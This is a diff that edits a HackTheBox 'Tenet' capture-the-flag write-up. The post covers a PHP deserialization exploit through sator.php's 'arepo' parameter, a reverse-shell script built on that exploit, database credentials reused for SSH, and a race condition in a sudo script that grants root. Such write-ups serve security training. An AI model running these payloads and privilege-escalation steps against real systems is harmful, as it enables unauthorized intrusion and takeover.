@@ -231,7 +231,6 @@ ________________________________________________
 
 </code></pre></div><p>But didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
 <h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
-<p>Another guessing, I think the keyword is &ldquo;Migration&rdquo;, so probably before moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
 <p>I found the files that user Neil was talking about at  <code>http://10.10.10.223/[here]</code>, without the hostname:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
 $ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://10.10.10.223/$i; <span style="color:#66d9ef">done</span>
@@ -248,12 +247,13 @@ ETag: <span style="color:#e6db74">&#34;202-5b6a5f47911e4&#34;</span>
 Accept-Ranges: bytes
 Content-Length: <span style="color:#ae81ff">514</span>
 Content-Type: application/x-trash
-</code></pre></div><p><code>Sator.php</code>:</p>
+</code></pre></div><p>Another guessing, I think the keyword is &ldquo;Migration&rdquo;, so probably before moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
+<p>Poking <code>Sator.php</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
 $ curl -s http://10.10.10.223/sator.php
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
 <span style="color:#f92672">[]</span> Database updated &lt;br&gt;
-</code></pre></div><p><code>sator.php.bak</code>:</p>
+</code></pre></div><p>]Poking <code>sator.php.bak</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
 $ curl -s http://10.10.10.223/sator.php.bak
 &lt;?php
@@ -286,25 +286,27 @@ $app -&gt; update_db<span style="color:#f92672">()</span>;
 
 
 ?&gt;
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="object-injectiondeserialization-attack">Object Injection/Deserialization attack</h4>
-<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but that function will be called when there is no more references to an object:</p>
-<pre><code>$app = new DatabaseExport;
-$app -&gt; update_db(); 
-// __destruct is called afterwards
-// [] Database updated will be printed out
-</code></pre><p>Examples:</p>
+</code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
+<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
+<p>First, from the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is the function will be called when there is no more references to an object (comment by me):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
+$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>(); 
+<span style="color:#75715e">// __destruct is called afterwards
+</span><span style="color:#75715e">// [] Database updated will be printed out
+</span></code></pre></div><p>Here&rsquo;s an example:</p>
 <p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
 </p>
-<p>There is no input validation/sanitization on the <code>$input</code> variable, I could send a serialized object of DatabaseExport which contains malicious things by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
-<p>Also since <code>unserialize</code> is called before the creation of object (<code>$app</code>), I&rsquo;ll use the opposite magic function called <code>__construct()</code>.</p>
-<pre><code>$input = $_GET['arepo'] ?? '';
-$databaseupdate = unserialize($input);
+<p>Second, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
+<p>Since <code>unserialize</code> is called before the creation of object (<code>$app</code>), I&rsquo;ll use the opposite magic function called <code>__construct()</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;...</span>
+$input <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;arepo&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$databaseupdate <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($input);
 
-$app = new DatabaseExport;
-$app -&gt; update_db();
-</code></pre><h4 id="testing-payload">Testing Payload</h4>
+$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
+$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>();
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="object-injectiondeserialization-poc">Object Injection/Deserialization PoC</h4>
 <p>First, I&rsquo;ll just do some testing with this script below and save it to a file called <code>tenetization.php</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
@@ -334,7 +336,17 @@ Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
 </code></pre></div><p>And that works!</p>
 <p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
 </p>
-<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
+<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
+{
+		<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test.php&#39;</span>;
+		<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;
+}
+$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
 <p>I&rsquo;ll modify the file name and the data for reverse shell.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
@@ -355,7 +367,7 @@ serial<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>ph
 curl -s http://10.10.10.223/sator.php?arepo<span style="color:#f92672">=</span>$serial
 sleep 5;
 curl -s http://10.10.10.223/iamf.php
-</code></pre></div><p>When I run the exploit it hangs</p>
+</code></pre></div><p>When I run the exploit, it hangs.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
 $ bash tenetization.sh
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
@@ -376,14 +388,12 @@ www-data@tenet:/var/www/html$
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-neil">Shell as neil</h3>
 <h4 id="wp-config">WP config</h4>
-<p>I found neil&rsquo;s credentials inside the <code>wp-config.php</code>.</p>
+<p>I found Neil&rsquo;s credentials inside the <code>wp-config.php</code> file.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
 cat wp-config.php
 &lt;?php
-...&lt;SNIP&gt;...
 
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
+...&lt;SNIP&gt;...
 define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> <span style="color:#f92672">)</span>;
 
 /** MySQL database username */
@@ -391,6 +401,7 @@ define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_U
 
 /** MySQL database password */
 define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;Opera2112&#39;</span> <span style="color:#f92672">)</span>;
+...&lt;SNIP&gt;...
 </code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
 <p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
@@ -420,7 +431,7 @@ Matching Defaults entries <span style="color:#66d9ef">for</span> neil on tenet:
 User neil may run the following commands on tenet:
     <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
 neil@tenet:~$ 
-</code></pre></div><h4 id="analysis">Analysis</h4>
+</code></pre></div><h4 id="script-analysis">Script analysis</h4>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
 -rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1080</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/enableSSH.sh
 neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
@@ -475,11 +486,11 @@ addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
 key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
 addKey
 checkAdded
-</code></pre></div><p>The value of <code>$key</code>  above will be placed temporary at <code>/tmp/SSH-randomfilename</code> before it get added into the <code>/root/.ssh/authorized_keys</code></p>
+</code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys file</code> by the <code>addKey()</code> function.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
 neil@tenet:~$ echo $tmpName
 /tmp/ssh-4swbpcnN
-</code></pre></div><p>If the <code>$key</code> is available at <code>/root/.ssh/authorized_keys</code>, it&rsquo;ll returns a success message, if it&rsquo;s not, it&rsquo;ll return an error message.</p>
+</code></pre></div><p>The  <code>checkAdded</code> will take the  <code>username@hostname</code> part from <code>$key</code> value and check if that value is already exist in <code>/root/.ssh/authorized_keys</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
 
                 /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
@@ -489,7 +500,7 @@ neil@tenet:~$ echo $tmpName
                 /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
 
         <span style="color:#66d9ef">fi</span>
-</code></pre></div><p>It&rsquo;s a race condition.</p>
+</code></pre></div><p>So, it&rsquo;s a race condition.</p>
 <p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key.</p>
 <h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
 <p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
